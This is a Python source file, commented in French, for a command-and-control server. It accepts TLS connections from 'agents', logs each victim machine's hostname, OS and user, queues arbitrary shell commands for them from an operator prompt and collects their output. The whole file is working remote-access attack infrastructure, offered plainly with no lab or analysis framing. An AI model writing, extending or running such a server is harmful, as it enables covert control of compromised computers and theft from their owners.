import socket
import threading
import json
import os
import ssl

CERT_PATH = os.path.join(os.path.dirname(__file__), "cert.pem")
KEY_PATH = os.path.join(os.path.dirname(__file__), "key.pem")

DB_FILE = "agents_db.json"
command_queue = {}


# Chargement initial ddu json
if os.path.exists(DB_FILE):
    with open(DB_FILE, "r") as f:
        agents_db = json.load(f)
else:
    agents_db = {}

# Sauvegarde automatique de la base
def save_db():
    with open(DB_FILE, "w") as f:
        json.dump(agents_db, f, indent=4)

last_results = {} 

def handle_agent(conn, addr):
    try:
        data = conn.recv(4096).decode()
        agent_data = json.loads(data)
        agent_id = agent_data.get("id")

        # Cas 1 : retour de commande
        if "result" in agent_data:
            last_results[agent_id] = agent_data["result"]
            print(f"[=] Résultat de {agent_id} :\n{agent_data['result']}\n")
            return

        # Cas 2 : enregistrement de l'agent
        agents_db[agent_id] = {
            "ip": addr[0],
            "hostname": agent_data.get("hostname"),
            "os": agent_data.get("os"),
            "user": agent_data.get("user"),
            "python_version": agent_data.get("python-version"),
        }
        save_db()
        print(f"[+] Agent {agent_id} enregistré depuis {addr[0]}")

        # Envoie de commande si disponible
        response = {"status": "ok"}
        if agent_id in command_queue:
            response["command"] = command_queue.pop(agent_id)

        conn.sendall(json.dumps(response).encode())

    except Exception as e:
        print(f"[!] Erreur avec {addr[0]} : {e}")
    finally:
        conn.close()



def server_listener(host='0.0.0.0', port=9001):
    if not os.path.exists(CERT_PATH) or not os.path.exists(KEY_PATH):
        print("[-] Certificat ou clé manquant. Veuillez générer un certificat SSL.")
        return
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=CERT_PATH, keyfile=KEY_PATH)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((host, port))
        sock.listen()
        print(f"[*] Serveur C2 sécurisé en écoute sur {host}:{port}")

        while True:
            client_sock, addr = sock.accept()
            conn = context.wrap_socket(client_sock, server_side=True)
            thread = threading.Thread(target=handle_agent, args=(conn, addr), daemon=True)
            thread.start()


def cli():
    while True:
        cmd = input("C2> ").strip()
        if cmd == "list":
            for aid, info in agents_db.items():
                print(f"- ID: {aid}, IP: {info['ip']}, Hostname: {info['hostname']}, OS: {info['os']}, User: {info['user']}")
        elif cmd == "exit":
            print("[*] Arrêt du serveur.")
            break
        elif cmd.startswith("send "):
            parts = cmd.split(" ", 2)
            if len(parts) < 3:
                print("Usage: send <agent_id> <commande>")
                continue
            agent_id = parts[1]
            command = parts[2]
            if agent_id in agents_db:
                command_queue[agent_id] = command
                print(f"[+] Commande envoyée à {agent_id}")
            else:
                print("[-] Agent introuvable")
        elif cmd.startswith("results"):
            for agent_id, output in last_results.items():
                print(f"\n[Résultat de {agent_id}]\n{output}\n")
        else:
            print("Commandes disponibles : list | exit")
        

if __name__ == "__main__":
    threading.Thread(target=server_listener, daemon=True).start()
    cli()